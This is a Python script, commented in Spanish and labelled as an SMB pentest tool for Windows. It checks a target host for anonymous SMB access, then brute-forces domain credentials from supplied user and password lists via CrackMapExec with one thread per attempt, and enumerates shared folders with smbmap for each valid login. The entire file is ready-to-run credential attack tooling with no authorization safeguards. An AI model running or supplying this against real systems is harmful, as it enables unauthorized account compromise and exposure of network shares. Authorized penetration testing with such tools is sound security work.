import argparse
import subprocess
import threading
import time
import queue

# Cola para almacenar credenciales válidas encontradas
valid_credentials = queue.Queue()

def check_host_availability(ip_target):
    """Verifica si el host está disponible antes de iniciar pruebas."""
    print(f"\033[34m[INFO] Verificando disponibilidad del host {ip_target}...\033[0m")
    
    cmd = ["ping", "-c", "1", ip_target]
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    if "1 received" in result.stdout:
        print(f"\033[32m[✔] El host {ip_target} está en línea.\033[0m")
        return True
    else:
        print(f"\033[31m[✘] El host {ip_target} no responde. Saliendo...\033[0m")
        return False

def check_anonymous_access(ip_target):
    """Verifica si es posible autenticarse con credenciales nulas en SMB."""
    print("\033[34m[INFO] Verificando autenticación anónima en SMB...\033[0m")
    
    cmd = ["smbclient", "-L", ip_target, "-N"]
    result = subprocess.run(cmd, capture_output=True, text=True)

    if "Anonymous login successful" in result.stdout:
        print(f"\033[32m[✔] Autenticación anónima permitida en {ip_target}.\033[0m")
        valid_credentials.put(("", ""))
        return True
    else:
        print(f"\033[31m[✘] No se permite autenticación anónima en {ip_target}.\033[0m")
        return False

def brute_force_users(ip_target, user_list, password_list, domain):
    """Realiza fuerza bruta de autenticación SMB usando usuarios y contraseñas."""
    print("\033[34m[INFO] Iniciando fuerza bruta de autenticación...\033[0m")
    
    with open(user_list, "r") as users, open(password_list, "r") as passwords:
        user_lines = [line.strip() for line in users]
        password_lines = [line.strip() for line in passwords]
    
    for user in user_lines:
        for password in password_lines:
            thread = threading.Thread(target=authenticate_user, args=(ip_target, user, password, domain))
            thread.start()
            time.sleep(0.5)  # Pequeña pausa para evitar sobrecarga

def authenticate_user(ip_target, user, password, domain):
    """Ejecuta CrackMapExec para verificar autenticación con dominio."""
    if not user and not password:
        print("\033[34m[INFO] Probando autenticación anónima...\033[0m")
        cmd = ["cme", "smb", ip_target, "--shares", "-u", "''", "-p", "''"]
    else:
        print(f"\033[34m[INFO] Probando autenticación con {domain}\\{user}@{ip_target}...\033[0m")
        cmd = ["cme", "smb", ip_target, "-u", user, "-p", password, "-d", domain]

    result = subprocess.run(cmd, capture_output=True, text=True)

    if "[+]" in result.stdout:
        print(f"\033[32m[✔] Credenciales válidas encontradas: {domain}\\{user}:{password}\033[0m")
        valid_credentials.put((user, password))
    else:
        print(f"\033[31m[✘] Credenciales incorrectas: {domain}\\{user}:{password}\033[0m")

def enumerate_smb_shares(ip_target, user, password, domain):
    """Ejecuta smbmap para listar carpetas compartidas si se encontró un usuario válido."""
    print(f"\033[34m[INFO] Listando carpetas compartidas para {domain}\\{user}...\033[0m")
    
    cmd = ["smbmap", "-H", ip_target, "-u", user, "-p", password, "-d", domain]
    result = subprocess.run(cmd, capture_output=True, text=True)

    print(f"\033[32m[✔] Resultados de smbmap:\n{result.stdout}\033[0m")

def main():
    parser = argparse.ArgumentParser(description="Pentest SMB en Windows")
    parser.add_argument("-ip-target", required=True, help="IP del objetivo")
    parser.add_argument("-user-list", required=True, help="Lista de usuarios")
    parser.add_argument("-password-list", required=True, help="Lista de contraseñas")
    parser.add_argument("-domain", required=True, help="Dominio del objetivo")
    
    args = parser.parse_args()

    # Verificar disponibilidad del host
    if not check_host_availability(args.ip_target):
        return

    # Verificar autenticación anónima antes de iniciar fuerza bruta
    if check_anonymous_access(args.ip_target):
        enumerate_smb_shares(args.ip_target, "", "", args.domain)

    # Iniciar fuerza bruta en segundo plano
    brute_force_thread = threading.Thread(target=brute_force_users, args=(args.ip_target, args.user_list, args.password_list, args.domain))
    brute_force_thread.start()

    # Monitorear credenciales válidas y ejecutar enumeración SMB
    while brute_force_thread.is_alive():
        while not valid_credentials.empty():
            user, password = valid_credentials.get()
            enumerate_smb_shares(args.ip_target, user, password, args.domain)
        time.sleep(1)

if __name__ == "__main__":
    main()
